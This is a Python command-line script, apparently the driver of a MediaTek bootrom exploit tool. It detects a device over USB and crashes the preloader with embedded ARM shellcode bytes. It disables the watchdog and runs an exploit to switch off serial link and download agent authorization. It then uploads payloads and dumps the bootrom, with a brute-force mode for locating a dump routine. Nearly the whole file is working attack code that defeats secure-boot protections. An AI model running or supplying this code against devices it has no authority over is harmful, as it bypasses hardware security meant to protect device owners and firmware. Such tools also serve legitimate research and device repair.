#!/bin/python3

from src.exploit import exploit
from src.common import from_bytes, to_bytes
from src.config import Config
from src.device import Device
from src.logger import log
from src.bruteforce import bruteforce

import argparse
import os

DEFAULT_CONFIG = "default_config.json5"
PAYLOAD_DIR = "payloads/"
DEFAULT_PAYLOAD = "generic_dump_payload.bin"
DEFAULT_DA_ADDRESS = 0x200D00


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config", help="Device config")
    parser.add_argument("-t", "--test", help="Testmode", const="0x9900", nargs='?')
    parser.add_argument("-w", "--watchdog", help="Watchdog address(in hex)")
    parser.add_argument("-u", "--uart", help="UART base address(in hex)")
    parser.add_argument("-v", "--var_1", help="var_1 value(in hex)")
    parser.add_argument("-a", "--payload_address", help="payload_address value(in hex)")
    parser.add_argument("-p", "--payload", help="Payload to use")
    parser.add_argument("-f", "--force", help="Force exploit on insecure device", action="store_true")
    parser.add_argument("-n", "--no_handshake", help="Skip handshake", action="store_true")
    parser.add_argument("-m", "--crash_method", help="Method to use for crashing preloader (0, 1, 2)", type=int)
    parser.add_argument("-k", "--kamakiri", help="Force use of kamakiri", action="store_true")
    arguments = parser.parse_args()

    if arguments.config:
        if not os.path.exists(arguments.config):
            raise RuntimeError("Config file {} doesn't exist".format(arguments.config))
    elif not os.path.exists(DEFAULT_CONFIG):
        raise RuntimeError("Default config is missing")

    device = Device().find()

    config, serial_link_authorization, download_agent_authorization, hw_code  = get_device_info(device, arguments)

    while device.preloader:
        device = crash_preloader(device, config)
        config, serial_link_authorization, download_agent_authorization, hw_code  = get_device_info(device, arguments)

    log("Disabling watchdog timer")
    device.write32(config.watchdog_address, 0x22000064)

    bootrom__name = "bootrom_" + hex(hw_code)[2:] + ".bin"

    if arguments.test and not arguments.kamakiri:
        dump_ptr = int(arguments.test, 16)
        found = False
        while not found:
            log("Test mode, testing " + hex(dump_ptr) + "...")
            found, dump_ptr = bruteforce(device, config, dump_ptr)
            device.dev.close()
            reconnect_message()
            device = Device().find(wait=True)
            device.handshake()
            while device.preloader:
                device = crash_preloader(device, config)
                device.handshake()
        log("Found " + hex(dump_ptr) + ", dumping bootrom to {}".format(bootrom__name))
        open(bootrom__name, "wb").write(bruteforce(device, config, dump_ptr, True))
        exit(0)

    if serial_link_authorization or download_agent_authorization or arguments.force:
        log("Disabling protection")

        payload = prepare_payload(config)

        result = exploit(device, config, payload, arguments)
        if arguments.test:
            while not result:
                device.dev.close()
                config.var_1 += 1
                log("Test mode, testing " + hex(config.var_1) + "...")
                reconnect_message()
                device = Device().find(wait=True)
                device.handshake()
                while device.preloader:
                    device = crash_preloader(device, config)
                    device.handshake()
                result = exploit(device, config, payload, arguments)
    else:
        log("Insecure device, sending payload using send_da")

        if not arguments.payload:
            config.payload = DEFAULT_PAYLOAD
        if not arguments.payload_address:
            config.payload_address = DEFAULT_DA_ADDRESS

        payload = prepare_payload(config)

        payload += b'\x00' * 0x100

        device.send_da(config.payload_address, len(payload), 0x100, payload)
        device.jump_da(config.payload_address)

        result = device.read(4)

    if result == to_bytes(0xA1A2A3A4, 4):
        log("Protection disabled")
    elif result == to_bytes(0xC1C2C3C4, 4):
        dump_brom(device, bootrom__name)
    elif result == to_bytes(0x0000C1C2, 4) and device.read(4) == to_bytes(0xC1C2C3C4, 4):
        dump_brom(device, bootrom__name, True)
    elif result != b'':
        raise RuntimeError("Unexpected result {}".format(result.hex()))
    else:
        log("Payload did not reply")

    device.close()

def reconnect_message():
    print("")
    print("Please reconnect device in bootrom mode")
    print("")

def dump_brom(device, bootrom__name, word_mode=False):
    log("Found send_dword, dumping bootrom to {}".format(bootrom__name))

    with open(bootrom__name, "wb") as bootrom:
        if word_mode:
            for i in range(0x20000 // 4):
                device.read(4)  # discard garbage
                bootrom.write(device.read(4))
        else:
            bootrom.write(device.read(0x20000))


def prepare_payload(config):
    with open(PAYLOAD_DIR + config.payload, "rb") as payload:
        payload = payload.read()

    # replace watchdog_address and uart_base in generic payload
    payload = bytearray(payload)
    if from_bytes(payload[-4:], 4, '<') == 0x10007000:
        payload[-4:] = to_bytes(config.watchdog_address, 4, '<')
    if from_bytes(payload[-8:][:4], 4, '<') == 0x11002000:
        payload[-8:] = to_bytes(config.uart_base, 4, '<') + payload[-4:]
    payload = bytes(payload)

    while len(payload) % 4 != 0:
        payload += to_bytes(0)

    return payload


def get_device_info(device, arguments):
    if not arguments.no_handshake:
        device.handshake()

    hw_code = device.get_hw_code()
    hw_sub_code, hw_ver, sw_ver = device.get_hw_dict()
    secure_boot, serial_link_authorization, download_agent_authorization = device.get_target_config()

    if arguments.config:
        config_file = open(arguments.config)
        config = Config().from_file(config_file, hw_code)
        config_file.close()
    else:
        try:
            config = Config().default(hw_code)
        except NotImplementedError as e:
            if arguments.test:
                config = Config()

                log(e)
            else:
                raise e

    if arguments.test:
        config.payload = DEFAULT_PAYLOAD
    if arguments.var_1:
        config.var_1 = int(arguments.var_1, 16)
    if arguments.watchdog:
        config.watchdog_address = int(arguments.watchdog, 16)
    if arguments.uart:
        config.uart_base = int(arguments.uart, 16)
    if arguments.payload_address:
        config.payload_address = int(arguments.payload_address, 16)
    if arguments.payload:
        config.payload = arguments.payload
    if arguments.crash_method:
        config.crash_method = arguments.crash_method


    if not os.path.exists(PAYLOAD_DIR + config.payload):
        raise RuntimeError("Payload file {} doesn't exist".format(PAYLOAD_DIR + config.payload))

    print()
    log("Device hw code: {}".format(hex(hw_code)))
    log("Device hw sub code: {}".format(hex(hw_sub_code)))
    log("Device hw version: {}".format(hex(hw_ver)))
    log("Device sw version: {}".format(hex(sw_ver)))
    log("Device secure boot: {}".format(secure_boot))
    log("Device serial link authorization: {}".format(serial_link_authorization))
    log("Device download agent authorization: {}".format(download_agent_authorization))
    print()

    return config, serial_link_authorization, download_agent_authorization, hw_code

def crash_preloader(device, config):
    print("")
    log("Found device in preloader mode, trying to crash...")
    print("")
    if config.crash_method == 0:
        try:
            payload = b'\x00\x01\x9F\xE5\x10\xFF\x2F\xE1' + b'\x00' * 0x110
            device.send_da(0, len(payload), 0, payload)
            device.jump_da(0)
        except RuntimeError as e:
            log(e)
            print("")
    elif config.crash_method == 1:
        payload = b'\x00' * 0x100
        device.send_da(0, len(payload), 0x100, payload)
        device.jump_da(0)
    elif config.crash_method == 2:
        device.read32(0)

    device.dev.close()

    device = Device().find()

    return device


if __name__ == "__main__":
    main()
